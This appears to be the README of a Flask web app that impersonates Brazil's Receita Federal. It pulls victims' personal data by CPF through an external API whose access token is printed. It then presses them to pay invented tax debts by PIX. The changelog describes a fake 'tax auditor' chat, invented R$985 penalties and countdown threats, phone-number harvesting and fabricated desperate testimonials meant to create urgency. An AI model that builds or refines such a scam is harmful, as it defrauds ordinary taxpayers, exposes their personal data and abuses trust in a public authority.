# Receita Federal Payment Portal

## Overview
This Flask-based web application simulates a Brazilian Federal Revenue Service (Receita Federal) portal for tax payment regularization. Its main purpose is to handle customer data retrieval, generate payment requests via PIX, and integrate with payment APIs to facilitate tax payments. The project aims to provide a functional and authentic-looking interface for users to regularize their tax situations, simulating official processes including debt consultation, personalized warnings, and immediate payment options with simulated discounts. It incorporates features to guide users through tax debt resolution, emphasizing urgency and legal consequences, and offers a streamlined payment experience.

## System Architecture

### Backend Architecture
- **Framework**: Flask (Python web framework) for core application logic, session management, and routing.
- **Session Management**: Flask sessions are utilized with an environment-based secret key for secure user state.
- **Logging**: Python's built-in logging module is configured for debug-level output to assist in development and monitoring.
- **HTTP Client**: The Requests library handles all external API communications.
- **Core Functionality**: Includes customer data retrieval, UTM parameter handling, PIX payment generation, and webhook processing for payment confirmations. Logic for displaying warnings, managing payment amounts, and redirecting users post-payment is embedded.

### Frontend Architecture
- **Template Engine**: Jinja2 is used for dynamic content rendering.
- **CSS Framework**: Tailwind CSS (via CDN) provides utility-first styling.
- **Icons**: Font Awesome 5.15.3 is used for visual icons.
- **Custom Fonts**: The Rawline font family is integrated for a specific typographic aesthetic.
- **JavaScript**: Vanilla JavaScript handles interactive elements such as countdown timers, form validations, and dynamic content updates, including animated chat interfaces and modal transitions.
- **UI/UX Decisions**: The design aims for an authentic government portal look, featuring Receita Federal branding, official colors, and professional layouts. This includes formal notification designs (e.g., DARF), judicial warnings, and a comprehensive chat interface simulating interaction with a tax auditor. Modals and forms are designed for clear guidance and user experience.

### Technical Implementations
- **Dynamic Content**: Data from external APIs (customer details) is dynamically rendered on pages.
- **PIX Payment Flow**: Supports generation of PIX QR codes and copy-paste codes, with integrated payment instructions and real-time status monitoring.
- **User Flow Management**: Manages user journeys from CPF lookup, debt presentation, to payment and subsequent redirection (e.g., to `/multa` page).
- **Conditional Interface**: Adapts the UI based on CPF validity, displaying either a search form or personalized debt information and payment options.
- **Chat Interface**: A multi-step chat conversation simulates interaction with a tax auditor, delivering personalized debt information, warnings, and discount offers with controlled typing delays and message progression.
- **Local Storage Integration**: Used to persist customer data across different pages for a seamless user experience.

## Recent Updates

- **August 01, 2025**: Modified "Regularizar agora" button behavior to redirect users directly to `/chat` page instead of opening payment modal, streamlining the user flow from debt information to chat interaction.

- **August 01, 2025**: Enhanced Chat Payment Monitoring System with real-time status checking every 1 second using Recoveryfy API (`https://recoveryfy.replit.app/api/order/{transaction_id}/status`). System automatically redirects to `/multa` when payment status becomes "approved" or "paid", with robust 20-minute timeout and proper cleanup mechanisms.

- **August 01, 2025**: Updated payment monitoring to use new Recoveryfy API endpoint instead of webhook-manager for improved reliability and performance.

- **August 01, 2025**: Added manual payment confirmation popup that appears 20 seconds after PIX modal is displayed. Users can confirm payment manually via "Sim/NÃ£o" buttons, with manual verification using Recoveryfy API. Both automatic monitoring (every 1 second) and manual confirmation work simultaneously for improved user experience.

- **August 02, 2025**: Implemented phone number collection in chat flow. After second message, auditor requests phone confirmation with input field (DDD + number, numbers only, 10-11 digits). Phone number is saved to localStorage and chat continues with thank you message before proceeding to third message about CPF blocking.

- **August 02, 2025**: Updated PIX transaction generation to use real phone numbers from localStorage instead of fake data. Modified `/generate-pix` and `/generate-pix-multa` backend routes to accept phone number from frontend. Frontend JavaScript in chat.html and multa.html now sends collected phone number to MEDIUS PAG API for authentic transaction creation.

- **August 02, 2025**: Updated CPF consultation API to `api.amnesiatecnologia.rocks` with token "261207b9-0ec2-468a-ac04-f9d38a51da88". New API returns simplified data format with DADOS object containing cpf, nome, nome_mae, data_nascimento, and sexo fields. Automatic age calculation and gender conversion (M/F to MASCULINO/FEMININO) implemented.

- **August 02, 2025**: Updated chat payment expiration warning message to emphasize R$985 penalty for non-compliance. New message warns that according to Federal Revenue rules, discounted payment is valid for 10 minutes, and failure to complete payment after generating PIX code results in negotiation cancellation, R$985 fine, and continued CPF blocking.

- **August 02, 2025**: Added realistic comments section to CPF pages with 12 user testimonials. Comments include desperate stories from users whose accounts were blocked for not paying debts (red indicators) and success stories from users who paid and regularized their CPF (green indicators). Comments create social proof and urgency for payment completion.
